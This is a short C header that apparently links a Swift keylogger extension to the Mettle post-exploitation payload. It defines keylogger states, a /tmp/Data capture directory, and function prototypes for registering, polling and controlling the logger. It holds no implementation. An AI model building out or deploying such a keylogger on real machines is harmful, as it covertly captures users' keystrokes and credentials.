#ifndef _SWIFT2METTLE_H
#define _SWIFT2METTLE_H

/*
 * Defined values.
 */
#define KEYLOGGER_STATE_STOP	0
#define KEYLOGGER_STATE_START	1
#define KEYLOGGER_STATE_DUMP	2
#define KEYLOGGER_STATE_RELEASE 3

#define KEYLOGGER_DATA_DIR      "/tmp/Data"

/*
 * Opaque items.
 */
struct extension;

/*
 * Functions accessible from swift.
 */
struct extension *keylogger_register(void);

void keylogger_poll_mettle(struct extension *e);

void keylogger_free(struct extension *e);

void keylogger_log(char const *msg);

int keylogger_get_state(void);

void keylogger_set_state(int state);

#endif
